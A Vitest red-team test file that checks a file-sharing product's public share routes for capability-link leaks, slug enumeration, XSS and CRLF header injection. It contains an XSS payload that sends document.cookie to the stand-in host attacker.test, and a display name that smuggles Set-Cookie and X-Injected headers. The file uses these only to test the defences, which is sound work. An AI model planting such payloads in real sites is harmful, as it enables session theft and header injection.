import { beforeEach, describe, expect, it } from 'vitest';
import { hasTestDatabase, truncateAll } from '../setup/db.js';
import { buildTestContainer } from '../setup/container.js';
import { createTenantWithReadyFile } from '../setup/fixtures.js';
import { buildApp } from '../../src/app.js';
import { files } from '../../src/db/repositories/files.js';
import { contentDispositionAttachment } from '../../src/lib/content-disposition.js';

/**
 * RED TEAM — the two unauthenticated public routes, `/s/:slug` and `/s/:slug/download`
 * (AC-U2/U3/U4). Attack surface: slug enumeration, the branded page leaking the
 * underlying Zoho capability URL through ANY channel (body, Location, Link, error text),
 * and tenant-controlled `display_name` reaching a response header or the HTML unescaped.
 */
describe.skipIf(!hasTestDatabase())('RED TEAM — public share surface', () => {
  beforeEach(async () => {
    await truncateAll();
  });

  it('BLOCKED: the branded page leaks neither the Zoho public link nor the resource id, in body or headers', async () => {
    const container = buildTestContainer({ BRANDED_PAGE_ENABLED: true });
    const app = await buildApp({ container });
    const { file } = await createTenantWithReadyFile(container, 'leak@example.com');
    expect(file.zoho_public_link).toBeTruthy();
    expect(file.zoho_resource_id).toBeTruthy();

    const page = await app.inject({ method: 'GET', url: `/s/${file.public_slug}` });
    expect(page.statusCode).toBe(200);
    const pageSurface = page.body + JSON.stringify(page.headers);
    expect(pageSurface).not.toContain(file.zoho_public_link!);
    expect(pageSurface).not.toContain(file.zoho_resource_id!);
    expect(pageSurface).not.toContain(file.zoho_link_id!);
    expect(page.headers.location).toBeUndefined();

    const dl = await app.inject({ method: 'GET', url: `/s/${file.public_slug}/download` });
    expect(dl.statusCode).toBe(200);
    const dlHeaders = JSON.stringify(dl.headers);
    expect(dlHeaders).not.toContain(file.zoho_public_link!);
    expect(dlHeaders).not.toContain(file.zoho_resource_id!);
    expect(dlHeaders).not.toContain(file.zoho_link_id!);
    expect(dl.headers.location).toBeUndefined();
    expect(dl.headers.link).toBeUndefined();
  });

  it('BLOCKED: an unknown slug and an expired slug are indistinguishable', async () => {
    const container = buildTestContainer({ BRANDED_PAGE_ENABLED: true });
    const app = await buildApp({ container });
    const { tenant, file } = await createTenantWithReadyFile(container, 'enum@example.com');
    await files.updateSettings(container.pool, tenant.id, file.id, {
      expiresAt: new Date(container.fakes.clock.now().getTime() - 1000),
    });

    const expired = await app.inject({ method: 'GET', url: `/s/${file.public_slug}` });
    const unknown = await app.inject({ method: 'GET', url: `/s/${'z'.repeat(26)}` });
    expect(expired.statusCode).toBe(unknown.statusCode);
    expect(expired.body).toBe(unknown.body);

    const expiredDl = await app.inject({ method: 'GET', url: `/s/${file.public_slug}/download` });
    const unknownDl = await app.inject({ method: 'GET', url: `/s/${'z'.repeat(26)}/download` });
    expect(expiredDl.statusCode).toBe(410);
    expect(unknownDl.statusCode).toBe(410);
    expect(expiredDl.body).toBe(unknownDl.body);
  });

  it('BLOCKED: with the flag OFF both routes are indistinguishable from a missing route', async () => {
    const container = buildTestContainer({ BRANDED_PAGE_ENABLED: false });
    const app = await buildApp({ container });
    const { file } = await createTenantWithReadyFile(container, 'flagoff@example.com');

    const real = await app.inject({ method: 'GET', url: `/s/${file.public_slug}` });
    const fake = await app.inject({ method: 'GET', url: `/s/${'z'.repeat(26)}` });
    expect(real.statusCode).toBe(404);
    expect(fake.statusCode).toBe(404);
    expect(real.body).toBe(fake.body);
    expect(real.body).not.toContain('zoho');
  });

  it('BLOCKED: a hostile display_name is HTML-escaped on the branded page', async () => {
    const container = buildTestContainer({ BRANDED_PAGE_ENABLED: true });
    const app = await buildApp({ container });
    const { tenant, file } = await createTenantWithReadyFile(container, 'xss@example.com');
    const hostile = `"><script>fetch('https://attacker.test/'+document.cookie)</script>`;
    await files.updateSettings(container.pool, tenant.id, file.id, { displayName: hostile });

    const page = await app.inject({ method: 'GET', url: `/s/${file.public_slug}` });
    expect(page.statusCode).toBe(200);
    expect(page.body).not.toContain('<script>fetch');
    expect(page.body).toContain('&lt;script&gt;');
  });

  it('BLOCKED: a display_name carrying CRLF cannot inject a response header', async () => {
    const container = buildTestContainer({ BRANDED_PAGE_ENABLED: true });
    const app = await buildApp({ container });
    const { tenant, file } = await createTenantWithReadyFile(container, 'crlf@example.com');
    await files.updateSettings(container.pool, tenant.id, file.id, {
      displayName: 'a.pdf"\r\nX-Injected: yes\r\nSet-Cookie: swy_sess=stolen',
    });

    const dl = await app.inject({ method: 'GET', url: `/s/${file.public_slug}/download` });
    expect(dl.statusCode).toBe(200);
    expect(dl.headers['x-injected']).toBeUndefined();
    expect(String(dl.headers['content-disposition'])).not.toMatch(/[\r\n]/);
    // Unit-level pin on the sanitizer itself.
    expect(contentDispositionAttachment('a"\r\nX: y')).toBe(
      `attachment; filename="a___X: y"; filename*=UTF-8''a%22%0D%0AX%3A%20y`,
    );
  });

  it('OBSERVED: every response advertises `frame-src https://workdrive.zohoexternal.com` in its CSP', async () => {
    // Not a capability leak — no token or URL — but it is a white-label leak: AC-U3 wants
    // the recipient to see "Swenlly", not "Zoho WorkDrive", and the CSP names Zoho on
    // EVERY response, including `/s/:slug/download` and the expired page where no iframe
    // is rendered at all. Pinned as an observation.
    const container = buildTestContainer({ BRANDED_PAGE_ENABLED: true });
    const app = await buildApp({ container });
    const { file } = await createTenantWithReadyFile(container, 'csp@example.com');
    const dl = await app.inject({ method: 'GET', url: `/s/${file.public_slug}/download` });
    expect(String(dl.headers['content-security-policy'])).toContain(
      'frame-src https://workdrive.zohoexternal.com',
    );
  });

  it(
    'CRITIC F-E (docs/reviews/critic-report.md): a null embedToken (no distinct embed ' +
      'field in the create-link response) renders the branded page WITHOUT an iframe, ' +
      'never falling back to a substring of the raw Zoho link',
    async () => {
      const container = buildTestContainer({ BRANDED_PAGE_ENABLED: true });
      const app = await buildApp({ container });
      // Forces this file's publish-time createPublicLink call to return embedToken:
      // null, the same shape the real adapter now returns whenever Zoho's response
      // carries no embed_url/embed_link (fix pass 5, F-E — the old real-adapter fallback
      // derived a token from the raw link's own trailing path segment instead).
      container.fakes.fileStore.forceNullEmbedTokenOnNextLink();
      const { file } = await createTenantWithReadyFile(container, 'null-embed@example.com');
      expect(file.zoho_embed_token).toBeNull();
      expect(file.zoho_public_link).toBeTruthy();

      const page = await app.inject({ method: 'GET', url: `/s/${file.public_slug}` });
      expect(page.statusCode).toBe(200);
      expect(page.body).not.toContain('<iframe');
      expect(page.body).toContain(`href="/s/${file.public_slug}/download"`);

      // No iframe at all — but assert the stronger, critic-specified property too: no
      // response surface (body or headers) contains ANY substring of the raw Zoho
      // link's own path of at least 12 characters (not just the whole string, which the
      // sibling "leak" test above already covers) — a derived-token leak would surface
      // as exactly this kind of partial match.
      const rawPath = new URL(file.zoho_public_link!).pathname;
      const pageSurface = page.body + JSON.stringify(page.headers);
      for (let i = 0; i + 12 <= rawPath.length; i++) {
        const chunk = rawPath.slice(i, i + 12);
        expect(pageSurface).not.toContain(chunk);
      }
    },
  );

  it('OBSERVED: neither public route is rate-limited (slug enumeration is unthrottled)', async () => {
    // Not exploitable against a 130-bit slug, but it is the only unauthenticated GET
    // surface in the product and `rateLimit` is registered `{ global: false }`, so it has
    // no per-IP ceiling at all. Pinned as an observation, not a fail.
    const container = buildTestContainer({ BRANDED_PAGE_ENABLED: true });
    const app = await buildApp({ container });
    const codes = new Set<number>();
    for (let i = 0; i < 120; i++) {
      const res = await app.inject({ method: 'GET', url: `/s/${'a'.repeat(20)}${i}` });
      codes.add(res.statusCode);
    }
    expect([...codes]).toEqual([200]); // never a 429
  });
});
